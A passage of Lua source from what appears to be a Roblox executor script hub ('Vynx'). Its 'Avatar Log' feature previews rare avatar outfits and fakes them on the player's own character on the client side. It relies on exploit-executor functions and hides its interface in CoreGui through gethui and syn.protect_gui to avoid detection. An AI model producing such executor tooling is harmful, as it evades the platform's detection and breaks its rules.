    {name="Ice Horns",       value="500K R$", bodyColor="Institutional white", horns=6065501458, shirt=855778084, pants=398633812, body="slim", skin=Color3.fromRGB(242,238,228), shirtColor=Color3.fromRGB(140,220,255), pantsColor=Color3.fromRGB(40,46,60), hornColor=Color3.fromRGB(160,225,255), headless=true, korblox=true, sparkle={140,220,255}},
    {name="Sinister",        value="1M+ R$",  bodyColor="Really black",        horns=4794160929, shirt=909315624, pants=398633812, body="tall", skin=Color3.fromRGB(30,30,32), shirtColor=Color3.fromRGB(200,60,255), pantsColor=Color3.fromRGB(22,22,26), hornColor=Color3.fromRGB(160,40,210), headless=true, korblox=true, sparkle={200,60,255}},
    {name="Crimson Devil",   value="1M+ R$",  bodyColor="Really black",        horns=7790910859, shirt=855776103, pants=398633812, body="buff", skin=Color3.fromRGB(30,30,32), shirtColor=Color3.fromRGB(45, 160, 255), pantsColor=Color3.fromRGB(22,22,26), hornColor=Color3.fromRGB(75, 144, 255), headless=true, korblox=true, sparkle={255,60,60}},
    {name="Golden God",      value="1M+ R$",  bodyColor="Bright yellow",                hat=1365767,    shirt=855779323, pants=398633812, body="buff", skin=Color3.fromRGB(255,215,90), shirtColor=Color3.fromRGB(255,205,70), pantsColor=Color3.fromRGB(40,36,20), hatColor=Color3.fromRGB(255,215,90), headless=true, korblox=true, sparkle={255,230,120}},
    {name="Dominus Void",    value="1M+ R$",  bodyColor="Really black",        hat=21070012,   shirt=909315624, pants=398633812, body="tall", skin=Color3.fromRGB(20,20,24), shirtColor=Color3.fromRGB(60,20,110), pantsColor=Color3.fromRGB(14,14,18), hatColor=Color3.fromRGB(120,40,200), headless=true, korblox=true, sparkle={180,80,255}},
    {name="Inferno Wraith",  value="1M+ R$",  bodyColor="Really black",        hat=31101391,   shirt=430319499, pants=398633812, body="slim", skin=Color3.fromRGB(30,30,32), shirtColor=Color3.fromRGB(90, 185, 255), pantsColor=Color3.fromRGB(20,20,24), hatColor=Color3.fromRGB(100, 190, 255), headless=true, korblox=true, sparkle={255,120,50}},
    {name="Frost Titan",     value="1M+ R$",  bodyColor="Institutional white", horns=14124593674, shirt=855778084, pants=398633812, body="blocky", skin=Color3.fromRGB(230,240,250), shirtColor=Color3.fromRGB(150,230,255), pantsColor=Color3.fromRGB(40,46,60), hornColor=Color3.fromRGB(90,200,255), headless=true, korblox=true, sparkle={120,220,255}},
    {name="Frigidus Lord",   value="90M+ R$", bodyColor="Institutional white", hat=48545806,    shirt=855778084, pants=398633812, body="tall", skin=Color3.fromRGB(225,238,248), shirtColor=Color3.fromRGB(120,200,255), pantsColor=Color3.fromRGB(34,42,58), hatColor=Color3.fromRGB(120,200,255), headless=true, korblox=true, sparkle={150,215,255}},
}

function M.avLogFolder()
    if M._avLogFolderInst and M._avLogFolderInst.Parent then return M._avLogFolderInst end
    local old = workspace:FindFirstChild("VynxAvatarLog_Preview")
    if old then pcall(function() old:Destroy() end) end
    local f = Instance.new("Folder")
    f.Name = "VynxAvatarLog_Preview"
    f.Parent = workspace
    M._avLogFolderInst = f
    return f
end

function M.avLogOrbit(cam, center, angle, dist)
    local pos = center + Vector3.new(math.sin(angle) * dist, dist * 0.32, math.cos(angle) * dist)
    cam.CFrame = CFrame.lookAt(pos, center)
end

local AVLOG_BODIES = {
    classic = { head = 1.0, torso = Vector3.new(1.9, 2.0, 0.9), arm = Vector3.new(0.9, 1.9, 0.9), leg = Vector3.new(0.9, 1.8, 0.9), torsoY = 0.7 },
    buff    = { head = 1.05, torso = Vector3.new(2.2, 2.05, 1.0), arm = Vector3.new(1.05, 1.95, 1.05), leg = Vector3.new(1.0, 1.85, 1.0), torsoY = 0.75 },
    slim    = { head = 1.0, torso = Vector3.new(1.7, 1.95, 0.8), arm = Vector3.new(0.8, 1.9, 0.8), leg = Vector3.new(0.85, 1.85, 0.85), torsoY = 0.72 },
    tall    = { head = 1.0, torso = Vector3.new(1.85, 2.35, 0.85), arm = Vector3.new(0.82, 2.2, 0.82), leg = Vector3.new(0.85, 2.1, 0.85), torsoY = 0.78 },
    blocky  = { head = 1.12, torso = Vector3.new(2.0, 2.0, 1.0), arm = Vector3.new(1.0, 2.0, 1.0), leg = Vector3.new(1.0, 2.0, 1.0), torsoY = 0.7 },
}

local function avBrick(name)
    local ok, bc = pcall(function() return BrickColor.new(name or "Institutional white") end)
    if ok and bc then return bc end
    return BrickColor.new("Institutional white")
end

local function avBrickColor(name)
    local ok, c = pcall(function() return BrickColor.new(name or "Institutional white").Color end)
    if ok and c then return c end
    return Color3.fromRGB(150, 150, 158)
end

function M.avLogInsert(id)
    id = tonumber(id)
    if not id or id == 0 then return nil end
    local url = "rbxassetid://" .. tostring(id)
    local bag = {}
    pcall(function()
        if typeof(getobjects) == "function" then
            local t = getobjects(url)
            if type(t) == "table" then for _, o in ipairs(t) do table.insert(bag, o) end end
        elseif game.GetObjects then
            local t = game:GetObjects(url)
            if type(t) == "table" then for _, o in ipairs(t) do table.insert(bag, o) end end
        end
    end)
    pcall(function()
        local m = game:GetService("InsertService"):LoadAsset(id)
        if m then
            if m:IsA("Model") then
                for _, o in ipairs(m:GetChildren()) do table.insert(bag, o) end
            else
                table.insert(bag, m)
            end
        end
    end)
    pcall(function()
        local IS = game:GetService("InsertService")
        if IS.LoadLocalAsset then
            local o = IS:LoadLocalAsset(url)
            if o then table.insert(bag, o) end
        end
    end)
    if #bag > 0 then return bag end
    return nil
end

function M.avLogAttachReal(m, id, yOff)
    task.spawn(function()
        if not m or not m.Parent then return end
        local objs = M.avLogInsert(id)
        if not objs then return end
        local head = m:FindFirstChild("Head")
        if not head then return end
        for _, o in ipairs(objs) do
            if o and (o:IsA("Accessory") or o:IsA("Hat")) then
                local h = o:FindFirstChild("Handle") or o:FindFirstChildOfClass("BasePart")
                if h then
                    for _, d in ipairs(o:GetDescendants()) do
                        if d:IsA("Script") or d:IsA("LocalScript") or d:IsA("Attachment") or d:IsA("Humanoid") then
                            pcall(function() d:Destroy() end)
                        end
                    end
                    local delta = (head.Position + Vector3.new(0, yOff, 0)) - h.Position
                    for _, d in ipairs(o:GetDescendants()) do
                        if d:IsA("BasePart") then
                            d.Anchored = true
                            d.CanCollide = false
                            d.CastShadow = false
                            d.Position = d.Position + delta
                        end
                    end
                    o.Parent = m
                    for _, d in ipairs(m:GetChildren()) do
                        if d:IsA("BasePart") and (d.Name:sub(1, 3) == "Hat" or d.Name:sub(1, 4) == "Horn") then
                            pcall(function() d:Destroy() end)
                        end
                    end
                end
            end
        end
    end)
end

function M.avLogFigure(vis, basePos, withReal, container)
    local m = Instance.new("Model")
    m.Name = "AvatarFigure_" .. tostring(vis.name or "avatar")
    local b = AVLOG_BODIES[vis.body] or AVLOG_BODIES.classic
    local skin = vis.skin or Color3.fromRGB(150, 150, 158)
    local shirt = vis.shirt or skin
    local pants = vis.pants or skin
    local sleeve = vis.sleeves or shirt
    local shoe = vis.shoes or Color3.fromRGB(math.floor(pants.R*255*0.45), math.floor(pants.G*255*0.45), math.floor(pants.B*255*0.45))
    local belt = vis.belt or Color3.fromRGB(math.floor(shirt.R*255*0.5), math.floor(shirt.G*255*0.5), math.floor(shirt.B*255*0.5))
    local collar = vis.collar or Color3.fromRGB(245, 245, 248)
    local korbloxLeg = (vis.korblox and Color3.fromRGB(25, 25, 30)) or pants

    local function part(name, size, pos, color, meshType, meshScale)
        local p = Instance.new("Part")
        p.Name = name
        p.Size = size
        p.Anchored = true
        p.CanCollide = false
        p.CastShadow = false
        p.Material = Enum.Material.SmoothPlastic
        p.Color = color or skin
        p.Position = basePos + pos
        p.Parent = m
        if meshType then
            local sm = Instance.new("SpecialMesh")
            sm.MeshType = meshType
            sm.Scale = Vector3.new(meshScale or 1, meshScale or 1, meshScale or 1)
            sm.Parent = p
        end
        return p
    end

    local headY = b.torsoY + b.torso.Y / 2 + b.head / 2 + 0.05
    local armY  = b.torsoY + b.torso.Y / 2 - b.arm.Y / 2 + 0.05
    local legY  = b.torsoY - b.torso.Y / 2 - b.leg.Y / 2

    local head = part("Head", Vector3.new(1, 1, 1), Vector3.new(0, headY, 0), skin, Enum.MeshType.Head, b.head)
    if vis.headless then
        head.Transparency = 1
    else
        local eyeZ = 0.5 * b.head + 0.03
        part("EyeL", Vector3.new(0.13, 0.17, 0.05), Vector3.new(-0.17 * b.head, headY + 0.08, eyeZ), Color3.fromRGB(18, 18, 20))
        part("EyeR", Vector3.new(0.13, 0.17, 0.05), Vector3.new(0.17 * b.head, headY + 0.08, eyeZ), Color3.fromRGB(18, 18, 20))
        part("Mouth", Vector3.new(0.32, 0.08, 0.05), Vector3.new(0, headY - 0.2, eyeZ), Color3.fromRGB(18, 18, 20))
    end

    part("Neck", Vector3.new(0.5, 0.32, 0.5), Vector3.new(0, b.torsoY + b.torso.Y / 2 + 0.14, 0), skin)

    local torso = part("Torso", b.torso, Vector3.new(0, b.torsoY, 0), shirt)
    part("Collar", Vector3.new(b.torso.X * 0.55, 0.16, b.torso.Z + 0.04), Vector3.new(0, b.torsoY + b.torso.Y / 2 - 0.03, b.torso.Z / 2 + 0.03), collar)

    for _, side in ipairs({-1, 1}) do
        local sx = side * (b.torso.X / 2 + b.arm.X / 2)
        part(side == -1 and "LeftArm" or "RightArm", b.arm, Vector3.new(sx, armY, 0), sleeve)
        local handY = armY - b.arm.Y / 2 - 0.24
        part(side == -1 and "LeftHand" or "RightHand", Vector3.new(b.arm.X * 0.95, 0.5, b.arm.Z * 0.95), Vector3.new(sx, handY, 0), skin)
    end

    for _, side in ipairs({-1, 1}) do
        local lx = side * b.leg.X / 2
        local col = (side == 1 and korbloxLeg) or pants
        part(side == -1 and "LeftLeg" or "RightLeg", b.leg, Vector3.new(lx, legY, 0), col)
        local shoeY = legY - b.leg.Y / 2 - 0.18
        part(side == -1 and "LeftShoe" or "RightShoe", Vector3.new(b.leg.X * 1.05, 0.36, b.leg.Z * 1.4), Vector3.new(lx, shoeY, 0.05), shoe)
    end

    part("Belt", Vector3.new(b.torso.X + 0.04, 0.2, b.torso.Z + 0.04), Vector3.new(0, b.torsoY - b.torso.Y / 2 + 0.03, 0), belt)

    local topY = b.torsoY + b.torso.Y / 2 + b.head + 0.12
    if vis.hatColor then
        part("HatBrim", Vector3.new(1.55, 0.16, 1.55), Vector3.new(0, topY, 0), vis.hatColor)
        part("HatTop", Vector3.new(0.9, 0.55, 0.9), Vector3.new(0, topY + 0.32, 0), vis.hatColor, Enum.MeshType.Cylinder, 1)
    elseif vis.hornColor then
        for _, side in ipairs({-1, 1}) do
            local h = part("Horn" .. side, Vector3.new(0.28, 0.95, 0.28), Vector3.new(side * 0.35, topY, 0), vis.hornColor)
            h.Orientation = Vector3.new(0, 0, side * -22)
        end
    end

    local lightPart = Instance.new("Part")
    lightPart.Name = "StageLight"
    lightPart.Size = Vector3.new(0.2, 0.2, 0.2)
    lightPart.Anchored = true
    lightPart.CanCollide = false
    lightPart.CastShadow = false
    lightPart.Transparency = 1
    lightPart.Position = basePos + Vector3.new(0, 4, 6)
    lightPart.Parent = m
    local light = Instance.new("PointLight")
    light.Brightness = 1.8
    light.Range = 18
    light.Shadows = false
    light.Parent = lightPart

    if withReal then
        if vis.hatId then
            M.avLogAttachReal(m, vis.hatId, 0.55)
        elseif vis.hornId then
            M.avLogAttachReal(m, vis.hornId, 0.5)
        end
    end

    m.PrimaryPart = torso
    m.Parent = container or M.avLogFolder()
    return m
end

function M.avLogRareVis(entry)
    local bodyC = avBrickColor(entry.bodyColor)
    return {
        name = entry.name,
        body = entry.body or "classic",
        skin = entry.skin or bodyC,
        shirt = entry.shirtColor or bodyC,
        pants = entry.pantsColor or bodyC,
        korblox = entry.korblox,
        headless = entry.headless,
        hatColor = entry.hatColor,
        hornColor = entry.hornColor,
        hatId = entry.hat,
        hornId = entry.horns,
    }
end

function M.avLogOffVis()
    return {
        name = "Off",
        body = "classic",
        skin = Color3.fromRGB(150, 150, 158),
        shirt = Color3.fromRGB(150, 150, 158),
        pants = Color3.fromRGB(110, 110, 120),
        korblox = false,
        headless = false,
    }
end

function M.avLogResolveVis()
    local label = M.wornAvatar
    if not label or label == "" then return M.avLogOffVis() end
    for _, a in ipairs(M.AVLOG_RARE or {}) do
        if a.name == label then return M.avLogRareVis(a) end
    end
    return M.avLogOffVis()
end

function M.avLogMakeBigPreview(parent, off)
    local vp = Instance.new("ViewportFrame")
    vp.Size = UDim2.new(1, 0, 0, 200)
    vp.BackgroundColor3 = AVLOG_VIEW_BG
    vp.BackgroundTransparency = 0
    vp.BorderSizePixel = 0
    vp.Ambient = Color3.fromRGB(96, 100, 110)
    vp.LightColor = Color3.fromRGB(255, 255, 255)
    vp.Parent = parent
    Instance.new("UICorner", vp).CornerRadius = UDim.new(0, 10)
    local vs = Instance.new("UIStroke")
    vs.Color = AVLOG_STROKE; vs.Transparency = 0.35
    vs.ApplyStrokeMode = Enum.ApplyStrokeMode.Border; vs.Parent = vp

    local cam = Instance.new("Camera")
    cam.CameraType = Enum.CameraType.Scriptable
    cam.FieldOfView = 40
    cam.Parent = vp
    vp.CurrentCamera = cam

    local item = { cam = cam, model = nil, angle = 0, dist = 10, center = AVLOG_BASE + Vector3.new(0, 0.5, 0) }

    local function refreshModel()
        if item.model then pcall(function() item.model:Destroy() end) end
        item.model = nil
        local shift = off or Vector3.new(0, 0, 0)
        local base = AVLOG_BASE + shift
        item.model = M.avLogFigure(M.avLogResolveVis(), base, true, vp)
        item.angle = 0
        item.center = base + Vector3.new(0, 0.5, 0)
    end
    item.refresh = refreshModel
    refreshModel()
    pcall(function() M.avLogOrbit(cam, item.center, item.angle, item.dist) end)
    table.insert(M._avLogSpinners, item)
    return vp, item
end

function M.avLogMakeRareDummy(entry, idx, off, container)
    local base = AVLOG_BASE + Vector3.new(120 + (idx or 1) * 30, 0, 0) + (off or Vector3.new(0, 0, 0))
    return M.avLogFigure(M.avLogRareVis(entry), base, false, container)
end

function M.avLogEnsureSpin()
    if M._avLogConn then return end
    M._avLogConn = RunService.RenderStepped:Connect(function(dt)
        local spinners = M._avLogSpinners or {}
        for i = #spinners, 1, -1 do
            local it = spinners[i]
            if not (it and it.cam and it.cam.Parent) then
                if it and it.model then pcall(function() it.model:Destroy() end) end
                table.remove(spinners, i)
            else
                it.angle = (it.angle or 0) + dt * 1.1
                if it.model and it.model.Parent and it.center then
                    pcall(function() M.avLogOrbit(it.cam, it.center, it.angle, it.dist or 7) end)
                end
            end
        end
    end)
end

local AVLOG_BODY_SCALES = {
    classic = { torso = Vector3.new(1, 1, 1), arm = Vector3.new(1, 1, 1), leg = Vector3.new(1, 1, 1), head = 1 },
    buff    = { torso = Vector3.new(1.16, 1.04, 1.10), arm = Vector3.new(1.14, 1, 1.14), leg = Vector3.new(1.08, 1, 1.08), head = 1.02 },
    slim    = { torso = Vector3.new(0.86, 0.97, 0.88), arm = Vector3.new(0.86, 1, 0.86), leg = Vector3.new(0.90, 1, 0.90), head = 1 },
    tall    = { torso = Vector3.new(0.98, 1.08, 0.96), arm = Vector3.new(1, 1.05, 1), leg = Vector3.new(1, 1.10, 1), head = 1 },
    blocky  = { torso = Vector3.new(1.06, 1, 1.10), arm = Vector3.new(1.06, 1, 1.06), leg = Vector3.new(1.06, 1, 1.06), head = 1.10 },
}

local function avLogIsOurs(inst)
    if not inst then return false end
    return tostring(inst.Name or ""):sub(1, 9) == "VynxAvLog" or inst:GetAttribute("VynxAvLog") == true
end

local function avLogIsKeep(inst)
    local n = tostring(inst and inst.Name or "")
    return avLogIsOurs(inst)
        or n:find("Vynx") ~= nil
        or n:find("Korblox") ~= nil
        or n == "HumanoidRootPart"
end

local function avLogFindPart(char, name)
    if not char then return nil end
    local p = name and char:FindFirstChild(name)
    if p and p:IsA("BasePart") then return p end
    local aliases = {
        Head = {"Head"},
        Torso = {"Torso", "UpperTorso", "LowerTorso"},
        ["Left Leg"] = {"Left Leg", "LeftUpperLeg", "LeftLowerLeg", "LeftFoot"},
        ["Right Leg"] = {"Right Leg", "RightUpperLeg", "RightLowerLeg", "RightFoot"},
        ["Left Arm"] = {"Left Arm", "LeftUpperArm", "LeftLowerArm", "LeftHand"},
        ["Right Arm"] = {"Right Arm", "RightUpperArm", "RightLowerArm", "RightHand"},
    }
    for _, alt in ipairs(aliases[name] or {name}) do
        p = char:FindFirstChild(alt)
        if p and p:IsA("BasePart") then return p end
    end
    return char:FindFirstChild("Head")
end

function M.avLogStripChar(char)
    if not char then return end
    for _, v in ipairs(char:GetChildren()) do
        if avLogIsKeep(v) then
        elseif v:IsA("Accessory") or v:IsA("Hat") or v:IsA("Shirt") or v:IsA("Pants")
            or v:IsA("ShirtGraphic") or v:IsA("CharacterMesh") or v.ClassName == "LayeredClothing" then
            pcall(function() v:Destroy() end)
        end
    end
end

function M.avLogPaintBody(char, brickName)
    local bc = char:FindFirstChildOfClass("BodyColors") or Instance.new("BodyColors")
    pcall(function()
        local w = avBrick(brickName)
        bc.HeadColor = w
        bc.TorsoColor = w
        bc.LeftArmColor = w
        bc.RightArmColor = w
        bc.LeftLegColor = w
        bc.RightLegColor = w
        bc.Parent = char
    end)
end

function M.avLogSetClassic(char, className, prop, id)
    if not id then return false end
    local objs = M.avLogInsert(id)
    local tag = "VynxAvLog_" .. className
    if objs then
        for _, obj in ipairs(objs) do
            if obj:IsA(className) then
                pcall(function() obj.Name = tag; obj:SetAttribute("VynxAvLog", true); obj.Parent = char end)
                return obj.Parent == char
            end
            local inner = obj:FindFirstChildWhichIsA(className, true)
            if inner then
                pcall(function() inner.Name = tag; inner:SetAttribute("VynxAvLog", true); inner.Parent = char end)
                return inner.Parent == char
            end
        end
    end
    local inst = char:FindFirstChild(tag) or char:FindFirstChildOfClass(className) or Instance.new(className)
    pcall(function()
        inst.Name = tag
        inst:SetAttribute("VynxAvLog", true)
        inst[prop] = "rbxassetid://" .. tostring(id)
        inst.Parent = char
    end)
    return inst.Parent == char
end

function M.avLogWeldInserted(char, id, preferPart, hideNames)
    local tag = "VynxAvLog_" .. tostring(id)
    local old = char:FindFirstChild(tag)
    if old then pcall(function() old:Destroy() end) end
    local objs = M.avLogInsert(id)
    if not objs then return false end
    local handle
    for _, obj in ipairs(objs) do
        if obj:IsA("CharacterMesh") then
            pcall(function() obj.Name = tag; obj:SetAttribute("VynxAvLog", true); obj.Parent = char end)
        end
        pcall(function() obj:WaitForChild("Handle", 1.5) end)
        handle = (obj:IsA("BasePart") and obj) or obj:FindFirstChild("Handle") or obj:FindFirstChildWhichIsA("BasePart", true)
        if handle then
            local target = avLogFindPart(char, preferPart)
            if not target then return false end
            if hideNames then
                for _, n in ipairs(hideNames) do
                    local limb = char:FindFirstChild(n)
                    if limb and limb:IsA("BasePart") then pcall(function() limb.Transparency = 1 end) end
                end
            end
            local srcAtt = handle:FindFirstChildOfClass("Attachment")
            local dstAtt = srcAtt and target:FindFirstChild(srcAtt.Name)
            if srcAtt and dstAtt then
                handle.CFrame = target.CFrame * dstAtt.CFrame * srcAtt.CFrame:Inverse()
            else
                handle.CFrame = target.CFrame
            end
            handle.Name = tag
            handle:SetAttribute("VynxAvLog", true)
            handle.Anchored = false
            handle.CanCollide = false
            handle.Massless = true
            handle.Parent = char
            local w = Instance.new("WeldConstraint")
            w.Part0 = target
            w.Part1 = handle
            w.Parent = handle
            return true
        end
    end
    return false
end

function M.avLogKorbloxRight(char)
    local target = avLogFindPart(char, "Right Leg")
    if not target then return false end
    local tag = "VynxAvLog_KorbloxR"
    local old = char:FindFirstChild(tag)
    if old then pcall(function() old:Destroy() end) end
    local objects = M.avLogInsert(139607718)
    if not (type(objects) == "table" and #objects > 0) then return false end
    local asset = objects[1]
    if asset:IsA("CharacterMesh") then
        asset.Name = tag
        asset:SetAttribute("VynxAvLog", true)
        pcall(function() asset.Parent = char end)
        return true
    end
    local mesh = asset:IsA("BasePart") and asset or asset:FindFirstChildWhichIsA("BasePart", true)
    if not mesh then return false end
    for _, n in ipairs({"Right Leg", "RightUpperLeg", "RightLowerLeg", "RightFoot"}) do
        local limb = char:FindFirstChild(n)
        if limb and limb:IsA("BasePart") then pcall(function() limb.Transparency = 1 end) end
    end
    mesh.Name = tag
    mesh:SetAttribute("VynxAvLog", true)
    mesh.CanCollide = false
    mesh.Massless = true
    mesh.Anchored = false
    mesh.CFrame = target.CFrame
    mesh.Parent = char
    local w = Instance.new("WeldConstraint")
    w.Part0 = target
    w.Part1 = mesh
    w.Parent = mesh
    if asset ~= mesh then pcall(function() asset:Destroy() end) end
    return true
end

function M.avLogHideFace(char)
    local head = char and char:FindFirstChild("Head")
    if not head then return end
    for _, d in ipairs(head:GetChildren()) do
        if d:IsA("Decal") or d:IsA("Texture") then
            pcall(function()
                d.Transparency = 1
                d.LocalTransparencyModifier = 1
                d:Destroy()
            end)
        end
    end
end

function M.avLogHeadless(char, on)
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end
    if on then
        head.Transparency = 1
        head.CanCollide = false
        M.avLogHideFace(char)
    else
        head.Transparency = 0
        head.CanCollide = true
    end
end

function M.avLogApplySparkles(char, rgb)
    local tag = "VynxAvLog_Sparkles"
    if char:FindFirstChild(tag) then return true end
    local target = avLogFindPart(char, "Torso")
    if not target then return false end
    local part = Instance.new("Part")
    part.Name = tag
    part:SetAttribute("VynxAvLog", true)
    part.Size = Vector3.new(0.25, 0.25, 0.25)
    part.Transparency = 1
    part.CanCollide = false
    part.CanQuery = false
    part.CanTouch = false
    part.Massless = true
    part.Anchored = false
    part.CastShadow = false
    part.CFrame = target.CFrame
    part.Parent = char
    local w = Instance.new("WeldConstraint")
    w.Part0 = target
    w.Part1 = part
    w.Parent = part
    local sp = Instance.new("Sparkles")
    sp.Name = "VynxAvLog_SparkleFX"
    local sc = rgb or {180, 230, 255}
    sp.SparkleColor = Color3.fromRGB(sc[1], sc[2], sc[3])
    sp.Enabled = true
    sp.Parent = part
    return true
end

function M.avLogApplyHatId(char, id)
    if not id then return true end
    local tag = "VynxAvLog_" .. tostring(id)
    if char:FindFirstChild(tag) then return true end
    return M.avLogWeldInserted(char, id, "Head") or char:FindFirstChild(tag) ~= nil
end

function M.avLogApplyHorns(char, id)
end

function M.avLogApplyHat(char, id)
    return M.avLogApplyHatId(char, id)
end

function M.avLogApplyBodyType(char, key)
    if not char then return end
    local s = AVLOG_BODY_SCALES[key] or AVLOG_BODY_SCALES.classic
    local groups = {
        { "Torso", "UpperTorso", "LowerTorso", s.torso },
        { "Left Arm", "LeftUpperArm", "LeftLowerArm", "LeftHand", s.arm },
        { "Right Arm", "RightUpperArm", "RightLowerArm", "RightHand", s.arm },
        { "Left Leg", "LeftUpperLeg", "LeftLowerLeg", "LeftFoot", s.leg },
        { "Right Leg", "RightUpperLeg", "RightLowerLeg", "RightFoot", s.leg },
    }
    local orig = M._avLogBodyOrig
    for _, g in ipairs(groups) do
        local scale = g[#g]
        for i = 1, #g - 1 do
            local p = char:FindFirstChild(g[i])
            if p and p:IsA("BasePart") then
                if not orig[p] then orig[p] = p.Size end
                local o = orig[p]
                p.Size = Vector3.new(o.X * scale.X, o.Y * scale.Y, o.Z * scale.Z)
            end
        end
    end
    local head = char:FindFirstChild("Head")
    if head and head:IsA("BasePart") then
        if not orig[head] then orig[head] = head.Size end
        head.Size = orig[head] * (s.head or 1)
    end
end

function M.avLogResetBody(char)
    if not char then return end
    for p, o in pairs(M._avLogBodyOrig or {}) do
        if p and p.Parent then p.Size = o end
    end
    M._avLogBodyOrig = {}
end

function M.avLogApplyOutfit(char, entry)
    if not char or not entry then return end
    if M._avLogApplying then return end
    M._avLogApplying = true
    local ok, err = pcall(function()
        M.avLogStripChar(char)
        M.avLogSetClassic(char, "Shirt", "ShirtTemplate", entry.shirt)
        M.avLogSetClassic(char, "Pants", "PantsTemplate", entry.pants)
        if entry.tshirt then
            M.avLogSetClassic(char, "ShirtGraphic", "Graphic", entry.tshirt)
        end
        M.avLogPaintBody(char, entry.bodyColor or "Institutional white")
        M.avLogHideFace(char)
        M.avLogKorbloxRight(char)
        M.avLogApplySparkles(char, entry.sparkle or {180, 230, 255})
        M.avLogApplyHorns(char, entry.horns)
        M.avLogApplyHat(char, entry.hat)
        M.avLogHeadless(char, entry.headless == true)
        M.avLogApplyBodyType(char, entry.body or "classic")
    end)
    M._avLogApplying = false
    if not ok then warn("[VYNX] Avatar Log outfit failed: " .. tostring(err)) end
end

function M.avLogRemoveOutfit(char)
    char = char or player.Character
    if not char then return end
    for _, v in ipairs(char:GetChildren()) do
        if avLogIsOurs(v) then
            pcall(function() v:Destroy() end)
        end
    end
    for _, n in ipairs({"Right Leg", "RightUpperLeg", "RightLowerLeg", "RightFoot"}) do
        local limb = char:FindFirstChild(n)
        if limb and limb:IsA("BasePart") then pcall(function() limb.Transparency = 0 end) end
    end
    M.avLogHeadless(char, false)
    M.avLogResetBody(char)
    if M._avLogSavedDesc then
        pcall(function()
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then hum:ApplyDescription(M._avLogSavedDesc) end
        end)
        M._avLogSavedDesc = nil
    end
end

function M.avLogMaintain(char)
    if not char then return end
    local entry
    for _, a in ipairs(M.AVLOG_RARE or {}) do
        if a.name == M.wornAvatar then entry = a break end
    end
    if not entry then return end
    for _, v in ipairs(char:GetChildren()) do
        if avLogIsKeep(v) then
        elseif v:IsA("Accessory") or v:IsA("Hat")
            or v:IsA("Shirt") or v:IsA("Pants") or v:IsA("ShirtGraphic") or v.ClassName == "LayeredClothing" then
            pcall(function() v:Destroy() end)
        end
    end
    if not char:FindFirstChild("VynxAvLog_Sparkles") then
        pcall(function() M.avLogApplySparkles(char, entry.sparkle or {180, 230, 255}) end)
    end
    if entry.horns then pcall(function() M.avLogApplyHorns(char, entry.horns) end) end
    if entry.hat then pcall(function() M.avLogApplyHat(char, entry.hat) end) end
    pcall(function() M.avLogKorbloxRight(char) end)
    pcall(function() M.avLogHeadless(char, entry.headless == true) end)
    pcall(function() M.avLogApplyBodyType(char, entry.body or "classic") end)
    pcall(function() M.avLogHideFace(char) end)
end

function M.avLogRefreshSelection(selected)
    if not M._avLogWin then return end
    for name, refs in pairs(M._avLogChipRefs or {}) do
        local sel = (name == selected)
        if refs.nameLbl and refs.nameLbl.Parent then
            refs.nameLbl.TextColor3 = sel and AVLOG_ACCENT or AVLOG_WHITE
        end
    end
end

function M.avLogWear(label, silent)
    if not label or label == "" or label == "Off" then
        M.avLogOutfitEnabled = false
        M.wornAvatar = nil
        pcall(function() M.avLogRemoveOutfit(player.Character) end)
        pcall(function() M.avLogRefreshSelection(nil) end)
        pcall(function() if M._avLogWinBig and M._avLogWinBig.refresh then M._avLogWinBig.refresh() end end)
        if not silent then pcall(saveCherryConfig) end
        return
    end
    local entry
    for _, a in ipairs(M.AVLOG_RARE or {}) do
        if a.name == label then entry = a break end
    end
    if not entry then return end
    M.wornAvatar = label
    M.avLogOutfitEnabled = true
    local char = player.Character
    if char then
        M._avLogSavedDesc = nil
        pcall(function()
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then
                local ok, d = pcall(function() return hum:GetAppliedDescription() end)
                if ok and d then M._avLogSavedDesc = d end
            end
        end)
        pcall(function() M.avLogApplyOutfit(char, entry) end)
    end
    pcall(function() M.avLogRefreshSelection(label) end)
    pcall(function() if M._avLogWinBig and M._avLogWinBig.refresh then M._avLogWinBig.refresh() end end)
    if not silent then pcall(saveCherryConfig) end
end

function M.avLogWearOff()
    M.avLogWear("Off")
end

local avLogGui

function M.avLogEnsureGui()
    if avLogGui and avLogGui.Parent then return avLogGui end
    local gui = Instance.new("ScreenGui")
    gui.Name = "VynxAvatarLogGui"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 200
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
    local parented = false
    if gethui then parented = pcall(function() gui.Parent = gethui() end) end
    if not parented then parented = pcall(function() gui.Parent = game:GetService("CoreGui") end) end
    if not parented then gui.Parent = player:WaitForChild("PlayerGui") end
    avLogGui = gui
    return gui
end

function M.avLogCloseWindow()
    if M._avLogWin then
        pcall(function() M._avLogWin:Destroy() end)
        M._avLogWin = nil
        M._avLogWinBig = nil
    end
end

function M.avLogOpenWindow()
    if M._avLogWin and M._avLogWin.Parent then
        M._avLogWin.Visible = true
        if M._avLogWinBig and M._avLogWinBig.refresh then pcall(M._avLogWinBig.refresh) end
        return
    end

    local gui = M.avLogEnsureGui()

    local overlay = Instance.new("TextButton")
    overlay.Name = "VynxAvatarLogWindow"
    overlay.Size = UDim2.new(1, 0, 1, 0)
    overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    overlay.BackgroundTransparency = 1
    overlay.BorderSizePixel = 0
    overlay.Text = ""
    overlay.AutoButtonColor = false
    overlay.ZIndex = 60
    overlay.Parent = gui
    overlay.MouseButton1Click:Connect(function()
        if M._avLogWin then M._avLogWin.Visible = false end
    end)
    M._avLogWin = overlay

    local win = Instance.new("TextButton")
    win.Name = "AvatarLogWin"
    win.AnchorPoint = Vector2.new(0.5, 0.5)
    win.Position = UDim2.new(0.5, 0, 0.5, 0)
    win.Size = UDim2.new(0, 372, 0, 540)
    win.BackgroundColor3 = AVLOG_WIN_BG
    win.BackgroundTransparency = 0
    win.BorderSizePixel = 0
    win.ClipsDescendants = false
    win.Text = ""
    win.AutoButtonColor = false
    win.ZIndex = 61
    win.Parent = overlay
    Instance.new("UICorner", win).CornerRadius = UDim.new(0, 16)

    local title = Instance.new("TextLabel")
    title.Position = UDim2.new(0, 18, 0, 12)
    title.Size = UDim2.new(1, -110, 0, 26)
    title.BackgroundTransparency = 1
    title.Text = "AVATAR LOG"
